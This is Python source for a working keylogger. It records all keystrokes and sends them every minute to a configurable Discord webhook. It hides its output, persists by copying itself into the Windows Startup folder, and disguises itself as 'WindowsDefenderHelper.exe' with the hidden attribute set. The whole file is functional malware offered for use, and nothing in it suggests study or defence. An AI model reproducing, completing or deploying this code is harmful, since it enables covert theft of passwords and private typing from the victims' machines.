import sys
import os
import shutil
import requests
import keyboard
from threading import Timer
from datetime import datetime

# ====== CONFIGURATION ======
WEBHOOK_URL = "YOUR_DISCORD_URL"
SEND_INTERVAL = 60  # Seconds between reports
STEALTH_MODE = True  # Hide all visible traces
# ===========================

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_").upper()
            name = f"[{name}]"
        self.log += name

    def send_to_webhook(self):
        if self.log:
            try:
                requests.post(WEBHOOK_URL, json={"content": self.log})
            except Exception as e:
                pass

    def report(self):
        self.send_to_webhook()
        self.log = ""
        Timer(interval=SEND_INTERVAL, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def persist():
    startup_path = os.path.join(
        os.environ["APPDATA"],
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        "WindowsDefenderHelper.exe"  # Camouflage name
    )

    # Copy file only if not already present
    if not os.path.exists(startup_path):
        try:
            current_file = os.path.abspath(sys.argv[0])
            shutil.copyfile(current_file, startup_path)
            
            # Hide the file using attrib command
            os.system(f'attrib +h "{startup_path}"')
        except Exception as e:
            pass

if __name__ == "__main__":
    if STEALTH_MODE:
        # Hide console window if running as EXE
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    # Establish persistence
    persist()
    
    # Start keylogger
    kl = Keylogger()
    kl.start()
